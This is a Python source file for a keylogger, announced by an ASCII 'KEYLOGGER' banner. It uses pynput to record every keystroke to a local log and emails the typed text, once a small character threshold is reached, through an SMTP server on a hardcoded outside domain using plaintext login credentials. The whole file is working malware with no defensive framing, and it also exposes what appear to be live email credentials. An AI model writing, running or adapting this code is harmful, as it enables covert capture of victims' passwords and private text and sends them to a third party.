import logging, smtplib

from pynput.keyboard import Key, Listener
from random import randint

output = '3ke' + str(randint(0, 10000)) + '.txt'

log_dir = ""

logging.basicConfig(filename=(log_dir + output), level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("""
//   __    __  ________  __      __  __         ______    ______    ______   ________  _______  
//  /  |  /  |/        |/  \    /  |/  |       /      \  /      \  /      \ /        |/       \ 
//  $$ | /$$/ $$$$$$$$/ $$  \  /$$/ $$ |      /$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$$$/ $$$$$$$  |
//  $$ |/$$/  $$ |__     $$  \/$$/  $$ |      $$ |  $$ |$$ | _$$/ $$ | _$$/ $$ |__    $$ |__$$ |
//  $$  $$<   $$    |     $$  $$/   $$ |      $$ |  $$ |$$ |/    |$$ |/    |$$    |   $$    $$< 
//  $$$$$  \  $$$$$/       $$$$/    $$ |      $$ |  $$ |$$ |$$$$ |$$ |$$$$ |$$$$$/    $$$$$$$  |
//  $$ |$$  \ $$ |_____     $$ |    $$ |_____ $$ \__$$ |$$ \__$$ |$$ \__$$ |$$ |_____ $$ |  $$ |
//  $$ | $$  |$$       |    $$ |    $$       |$$    $$/ $$    $$/ $$    $$/ $$       |$$ |  $$ |
//  $$/   $$/ $$$$$$$$/     $$/     $$$$$$$$/  $$$$$$/   $$$$$$/   $$$$$$/  $$$$$$$$/ $$/   $$/ 
//                                                                                              
//                                                                                              
//                                                                                        
""")

email = 'me@arinzejustinng.com.ng'
password = 'meemail@website'
server = smtplib.SMTP_SSL('mail.arinzejustinng.com.ng', 465)
server.login(email, password)

full_log = ""
word = ""
email_char_limit = 10


def on_press(key, false=None):
    global word
    global full_log
    global email
    global email_char_limit
    logging.info(str(key))

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return false


def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )


with Listener(on_press=on_press) as listener:
    listener.join()
